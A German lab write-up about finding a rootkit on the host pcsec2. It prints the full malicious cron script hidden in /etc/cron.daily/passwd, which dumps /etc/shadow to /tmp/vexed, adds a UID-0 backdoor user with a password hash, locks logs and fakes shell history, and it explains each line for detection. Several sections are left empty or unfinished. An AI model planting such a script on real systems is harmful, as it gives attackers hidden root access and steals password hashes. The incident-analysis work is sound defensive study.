# Aufgabe 7a – Rootkit entdecken und analysieren

## Was muss generell gemacht werden?

Bei der Suche nach einem Rootkit geht man systematisch vor:

1. **Prozesse prüfen** – Laufen unbekannte oder verdächtige Prozesse?
2. **Netzwerk prüfen** – Gibt es offene Ports oder Verbindungen, die nicht sein sollten?
3. **Dateisystem durchsuchen** – Gibt es versteckte Dateien, kürzlich veränderte Dateien oder unbekannte Dateien in `/tmp`, `/dev/shm` etc.?
4. **Cronjobs prüfen** – Wurde etwas in Cron eingeschleust?
5. **Benutzer prüfen** – Gibt es unbekannte Benutzer mit Root-Rechten (UID 0)?
6. **Integrität prüfen** – Wurden Systembinaries (`ls`, `ps`, `netstat`) manipuliert?
7. **Kernel-Module prüfen** – Sind unbekannte Module geladen?
8. **Logs prüfen** – Wurden Logdateien manipuliert oder Berechtigungen geändert?
9. **Bash-History prüfen** – Gibt es verdächtige Einträge oder wurde die History manipuliert?

---

## Ergebnis

**Das Rootkit befindet sich auf: `pcsec2`**

**Rootkit-Datei:** `/etc/cron.daily/passwd`

Das Rootkit tarnt sich als das legitime Backup-Skript `/etc/cron.daily/passwd`, das normalerweise nur `/etc/passwd`, `/etc/shadow` etc. nach `/var/backups` sichert. Auf pcsec2 wurde dieses Skript mit bösartigem Code erweitert.

### 2. Offene Ports prüfen

```bash
netstat -tlnp
```

- `-t` = nur TCP
- `-l` = nur lauschende (listening) Ports
- `-n` = numerische Adressen (kein DNS-Lookup)
- `-p` = zeigt den zugehörigen Prozess

**Ausgabe auf pcsec2:**
```
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      455/sshd
tcp6       0      0 :::22                   :::*                    LISTEN      455/sshd
```

**Worauf achten:**
- Unbekannte Ports (Backdoor-Ports sind oft hohe Nummern wie 31337, 4444, 5555)
- Ports die auf `0.0.0.0` lauschen (= von überall erreichbar)
- Prozesse die Ports öffnen, die nicht zum Dienst passen
- Fehlende Einträge (wenn `netstat` kompromittiert ist)

**Ergebnis:** Auf allen Servern nur SSH (Port 22) offen – normal.

```bash
netstat -ulnp
```

**Ausgabe auf gwsec:**

### 4. Versteckte Verzeichnisse suchen

```bash
find / -name ".*" -type d 2>/dev/null | grep -v "proc\|sys\|run\|tmp\|root"
```

- `find /` = durchsucht das gesamte Dateisystem
- `-name ".*"` = nur Dateien/Ordner die mit einem Punkt beginnen (versteckt)
- `-type d` = nur Verzeichnisse
- `2>/dev/null` = Fehlermeldungen unterdrücken
- `grep -v` = bestimmte normale Verzeichnisse ausfiltern

**Ausgabe auf allen Servern:**
```
(keine Ausgabe)
```

**Worauf achten:**
- Versteckte Verzeichnisse in `/usr/share/.hidden`, `/opt/.secret`, `/var/.cache`
- Verzeichnisse mit Namen wie `.` (nur Punkt), `..  ` (mit Leerzeichen), oder `. ` (Punkt+Leerzeichen)
- Bekannte Rootkit-Verzeichnisse: `/dev/.hdd`, `/usr/share/.a`, `/etc/.pwd.lock`

**Ergebnis:** Keine verdächtigen versteckten Verzeichnisse.


**Ausgabe auf pcsec1:**
```

```

**Ausgabe auf pcsec2:**
```

```

**Worauf achten:**

### 7. Backdoor-Benutzer im System suchen

```bash
grep "a5stR0b0y" /etc/passwd /etc/shadow
```

Sucht den verdächtigen Benutzernamen in den Passwort-Dateien.

**Ausgabe auf pcsec2:**
```
/etc/shadow:a5stR0b0y:shWm5UR68F3U8:0:0::/:/bin/bash
/etc/shadow:a5stR0b0y:x:0:0::/:/bin/bash
/etc/shadow:a5stR0b0y:shWm5UR68F3U8:0:0::/:/bin/bash
/etc/shadow:a5stR0b0y:x:0:0::/:/bin/bash
...
```

**Worauf achten:**
- Jeder Benutzer mit UID `0` (die dritte Spalte, getrennt durch `:`) hat Root-Rechte
- Das Format in `/etc/shadow` wäre normalerweise: `user:$hash:lastchange:min:max:warn:...`
- Hier steht aber passwd-Format (`user:hash:uid:gid:info:home:shell`) in der shadow-Datei → das Rootkit hat das falsche Format benutzt!
- `shWm5UR68F3U8` = DES-verschlüsseltes Passwort (sehr schwach, leicht knackbar)

**Ergebnis:** Der Benutzer `a5stR0b0y` ist NICHT in `/etc/passwd`, aber mehrfach in `/etc/shadow` mit Root-Rechten!

### 8. Rootkit-Skript in Cron-Dateien suchen

```bash
grep -r "a5stR0b0y\|shadow\|passwd" /etc/cron* 2>/dev/null
```

Durchsucht alle Cron-Dateien nach dem verdächtigen Benutzernamen.

**Ausgabe auf pcsec2:**
```
/etc/cron.daily/passwd:for FILE in passwd group shadow gshadow; do
/etc/cron.daily/passwd:cat /etc/passwd >> /tmp/vexed
/etc/cron.daily/passwd:cat /etc/shadow >> /tmp/vexed
/etc/cron.daily/passwd:echo a5stR0b0y:shWm5UR68F3U8:0:0::/:/bin/bash >> /etc/shadow
/etc/cron.daily/passwd:echo a5stR0b0y:x:0:0::/:/bin/bash >> /etc/shadow
```

**Worauf achten:**
- Cron-Skripte die in `/etc/shadow` schreiben sind IMMER verdächtig
- Skripte die Daten nach `/tmp` dumpen
- Das legitime `passwd`-Skript kopiert nur nach `/var/backups` – es schreibt NIEMALS in `/etc/shadow`

**Ergebnis:** Treffer in `/etc/cron.daily/passwd` auf pcsec2!

### 9. Rootkit-Skript anzeigen

```bash
cat /etc/cron.daily/passwd
```

**Ausgabe auf pcsec2 (kompromittiert):**

```bash
#!/bin/sh
cd /var/backups || exit 0
for FILE in passwd group shadow gshadow; do
        test -f /etc/$FILE              || continue
        cmp -s $FILE.bak /etc/$FILE     && continue
        cp -p /etc/$FILE $FILE.bak && chmod 600 $FILE.bak
        echo "roooootkit"
done

PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin

chmod 0 /root/.bash_history
chmod 0 /var/log/*
touch /tmp/vexed
chmod 0 /tmp/vexed
ps aux >> /tmp/vexed
cat /etc/passwd >> /tmp/vexed
cat /etc/shadow >> /tmp/vexed

echo a5stR0b0y:shWm5UR68F3U8:0:0::/:/bin/bash >> /etc/shadow
echo a5stR0b0y:x:0:0::/:/bin/bash >> /etc/shadow

chmod 744 /var/log/*
chmod 744 /root/.bash_history

echo ls -a >> ~/.bash_history
echo uptime >> ~/.bash_history
echo du . -m >> ~/.bash_history
echo w >> ~/.bash_history
echo dig something.org >> ~/.bash_history
echo man time >> ~/.bash_history
echo man hostname >> ~/.bash_history
echo ls -a >> ~/.bash_history
echo ls -a >> ~/.bash_history
echo ls -a >> ~/.bash_history
```

**Worauf achten (Zeile für Zeile):**

| Zeile | Was es tut | Warum verdächtig |
|-------|-----------|-----------------|
| `echo "roooootkit"` | Gibt "roooootkit" aus | Offensichtlicher Hinweis des Angreifers |
| `chmod 0 /root/.bash_history` | Macht History unlesbar | Verhindert, dass der Admin die History lesen kann |
| `chmod 0 /var/log/*` | Macht alle Logs unlesbar | Verhindert, dass Logs gelesen werden können |
| `touch /tmp/vexed` | Erstellt Datei | Erstellt die Sammeldatei |
| `chmod 0 /tmp/vexed` | Macht Datei unsichtbar | Verhindert, dass jemand sie liest (aber `root` kann trotzdem `cat` nutzen) |
| `ps aux >> /tmp/vexed` | Prozesse dumpen | Sammelt Informationen über das System |
| `cat /etc/passwd >> /tmp/vexed` | Benutzerliste dumpen | Sammelt alle Benutzernamen |
| `cat /etc/shadow >> /tmp/vexed` | Passwort-Hashes dumpen | **Kritisch!** Sammelt alle Passwort-Hashes |
| `echo ... >> /etc/shadow` | Backdoor-User erstellen | Erstellt Benutzer mit UID 0 = Root-Zugang |
| `chmod 744 /var/log/*` | Logs wieder lesbar | Stellt Logs wieder her (falsche Berechtigung! Normal wäre 640) |
| `echo ... >> ~/.bash_history` | Fake-History | Verschleiert den echten Verlauf mit harmlosen Befehlen |

**Zum Vergleich – das saubere Skript auf gwsec/pcsec1:**

```bash
#!/bin/sh
cd /var/backups || exit 0
for FILE in passwd group shadow gshadow; do
        test -f /etc/$FILE              || continue
        cmp -s $FILE.bak /etc/$FILE     && continue
        cp -p /etc/$FILE $FILE.bak && chmod 600 $FILE.bak
done
```

**Worauf achten beim Vergleich:**
- Das saubere Skript hat nur 7 Zeilen, das kompromittierte hat ~30+
- Das saubere Skript schreibt NIE in `/etc/shadow`
- Das saubere Skript ändert NIE Berechtigungen von Logs
- Das saubere Skript hat kein `echo "roooootkit"`

### 11. Integrität der Systembinaries prüfen

```bash
ls -la /bin/ls /bin/ps /bin/netstat /usr/bin/find /usr/bin/top
```

Prüft Dateigröße und Änderungsdatum der wichtigsten Systembefehle. Wenn diese manipuliert wären, könnten sie Rootkit-Prozesse verstecken.

**Ausgabe auf pcsec2:**
```
-rwxr-xr-x 1 root root 126584 Jan 18  2018 /bin/ls
-rwxr-xr-x 1 root root 151104 Dec 26  2016 /bin/netstat
-rwxr-xr-x 1 root root 129336 May 17  2018 /bin/ps
-rwxr-xr-x 1 root root 221768 Feb 18  2017 /usr/bin/find
-rwxr-xr-x 1 root root 108304 May 17  2018 /usr/bin/top
```

**Worauf achten:**
- Die Dateigrößen müssen auf ALLEN Servern identisch sein
- Das Datum sollte in der Vergangenheit liegen (Installationszeitpunkt des Pakets)
- Wenn eine Binary kürzlich geändert wurde (z.B. heute), ist sie wahrscheinlich kompromittiert
- SUID-Bit bei Dateien wo es nicht sein sollte (z.B. `/bin/ls` mit SUID = verdächtig)
- Man kann auch `md5sum` oder `sha256sum` zum Vergleichen nutzen

**Ergebnis:** Identische Größen und Daten auf allen drei Servern – keine Manipulation.

### 13. Berechtigungen der Log-Dateien prüfen

```bash
ls -la /var/log/
```

**Worauf achten:**
- Normale Berechtigung für Logs: `640` (rw-r-----) oder `644`
- Das Rootkit setzt `744` (rwxr--r--) → das `x`-Bit auf Logdateien ist sinnlos und verdächtig
- Logs mit Berechtigung `000` → aktiv blockiert

## Zusammenfassung: Was das Rootkit macht

| Aktion | Beschreibung |
|--------|-------------|
| **Backdoor** | Erstellt Benutzer `a5stR0b0y` mit UID 0 (Root) in `/etc/shadow` |
| **Passwort** | DES-Hash `shWm5UR68F3U8` |
| **Daten sammeln** | Schreibt `ps aux`, `/etc/passwd`, `/etc/shadow` nach `/tmp/vexed` |
| **Logs manipulieren** | Setzt Berechtigungen von `/var/log/*` temporär auf 0, dann 744 |
| **History fälschen** | Schreibt harmlose Fake-Befehle in `.bash_history` |
| **Persistenz** | Läuft als Cron-Daily-Job → wird jeden Tag automatisch ausgeführt |
| **Tarnung** | Versteckt sich im legitimen Skript `/etc/cron.daily/passwd` |
